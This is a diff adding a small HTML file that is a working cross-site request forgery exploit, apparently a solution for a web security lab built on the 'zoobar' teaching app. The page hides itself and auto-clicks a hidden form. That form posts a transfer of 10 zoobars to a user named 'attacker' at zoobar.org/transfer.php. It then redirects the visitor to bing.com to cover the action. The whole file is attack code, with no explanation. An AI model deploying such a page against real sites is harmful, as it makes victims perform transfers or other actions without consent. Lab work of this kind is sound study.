@@ -1,0 +1,16 @@
+<html>
+<body hidden>
+	<iframe name="frame"></iframe>
+	<form method="POST" action="http://zoobar.org/transfer.php" target="frame">
+	<input type="hidden" value="attacker" name="recipient">
+	<input type="hidden" value="10" name="zoobars">
+	<input type="submit" value="Send" name="submission" id="btn" onclick="redirect()">
+	</form>
+	<script>
+	function redirect() {
+		window.location.replace("http://www.bing.com");
+	}
+	document.getElementById("btn").click();
+	</script>
+</body>
+</html>
